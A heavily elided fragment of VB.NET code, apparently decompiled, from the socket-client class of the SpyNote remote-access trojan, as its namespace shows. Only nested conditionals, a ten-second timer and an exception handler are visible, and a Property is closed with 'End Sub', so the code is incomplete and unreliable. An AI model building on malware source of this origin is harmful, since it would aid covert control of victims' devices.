...
Namespace SN.Sockets.SpyNote.Client
    Public Class SocketClient
        ...
        Public Property NetworkStatus1 As Object
                    ...
                    Else
                        ...
                        Else
                            ...
                            If flag6 Then
                                ...
                                Me.Out_1 = DateTime.Now.AddSeconds(10.0)
                            End If
                        End If
                    End If
                End If
            Catch expr_187 As Exception
                Console.WriteLine(expr_187)
            End Try
        End Sub
